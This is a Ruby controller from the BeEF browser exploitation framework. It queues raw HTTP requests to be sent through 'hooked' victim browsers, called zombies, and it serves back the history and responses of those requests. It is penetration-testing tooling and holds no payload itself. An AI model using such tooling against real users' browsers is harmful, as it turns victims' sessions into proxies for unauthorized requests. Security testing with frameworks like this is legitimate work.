module BeEF
module UI

#
# HTTP Controller for the Requester component of BeEF.
#
class Requester < BeEF::HttpController
  
  # Variable representing the Http DB model.
  H = BeEF::Models::Http
  
  def initialize
    super({
      'paths' => {
        '/send'           => method(:send_request),
        '/history.json'   => method(:get_zombie_history),
        '/response.json'  => method(:get_zombie_response)
      }
    })
  end
  
  # Send a new http request to the hooked browser.
  def send_request
    # validate that the hooked browser's session has been sent
    zombie_session = @params['zombie_session'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "Zombie session is nil" if zombie_session.nil?
    
    # validate that the hooked browser exists in the db
    zombie = Z.first(:session => zombie_session) || nil
    raise WEBrick::HTTPStatus::BadRequest, "Invalid hooked browser session" if zombie.nil?
    
    # validate that the raw request has been sent
    raw_request = @params['raw_request'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "raw_request is nil" if raw_request.nil?
    raise WEBrick::HTTPStatus::BadRequest, "raw_request contains non-printable chars" if not Filter.has_non_printable_char?(raw_request)
    
    # validate nonce
    nonce = @params['nonce'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "nonce is nil" if nonce.nil?
    raise WEBrick::HTTPStatus::BadRequest, "nonce incorrect" if @session.get_nonce != nonce
    
    webrick = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
    
    # validate that the raw request is correct and can be used
    # will raise an exception on failure
    s = StringIO.new raw_request
    webrick.parse(s)
    
    # if the request is invalide, an exception will be raised
    Filter.is_valid_request?(webrick)
    
    # Saves the new HTTP request.
    http = H.new(
      :request => raw_request,
      :method => webrick.request_method,
      :domain => webrick.host,
      :path => webrick.unparsed_uri,
      :date => Time.now,
      :zombie_id => zombie.id
    )
    
    if webrick.request_method.eql? 'POST'
      http.content_length = webrick.content_length
    end
    
    http.save
    
    @body = '{success : true}'
  end
  
  # Returns a JSON object containing the history of requests sent to the zombie.
  def get_zombie_history
    # validate nonce
    nonce = @params['nonce'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "nonce is nil" if nonce.nil?
    raise WEBrick::HTTPStatus::BadRequest, "nonce incorrect" if @session.get_nonce != nonce
    
    # validate that the hooked browser's session has been sent
    zombie_session = @params['zombie_session'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "Zombie session is nil" if zombie_session.nil?
    
    # validate that the hooked browser exists in the db
    zombie = Z.first(:session => zombie_session) || nil
    raise WEBrick::HTTPStatus::BadRequest, "Invalid hooked browser session" if zombie.nil?
    
    history = []
    H.all(:zombie_id => zombie.id).each{|http|
      history << {
        'id'      => http.id,
        'domain'  => http.domain,
        'path'    => http.path,
        'has_ran' => http.has_ran,
        'date'    => http.date
      }
    }
    
    @body = {'success' => 'true', 'history' => history}.to_json
  end
  
  # Returns a JSON objecting containing the response of a request.
  def get_zombie_response
    # validate nonce
    nonce = @params['nonce'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "nonce is nil" if nonce.nil?
    raise WEBrick::HTTPStatus::BadRequest, "nonce incorrect" if @session.get_nonce != nonce
    
    # validate the http id
    http_id = @params['http_id'] || nil
    raise WEBrick::HTTPStatus::BadRequest, "http_id is nil" if http_id.nil?
    
    # validate that the http object exist in the dabatase
    http_db = H.first(:id => http_id) || nil
    raise WEBrick::HTTPStatus::BadRequest, "http object could not be found in the database" if http_db.nil?
    
    res = {
      'id'        => http_db.id,
      'request'   => http_db.request,
      'response'  => http_db.response,
      'domain'    => http_db.domain,
      'path'      => http_db.path,
      'date'      => http_db.date,
      'has_ran'   => http_db.has_ran
    }
    
    @body = {'success' => 'true', 'result' => res}.to_json
  end
  
end

end
end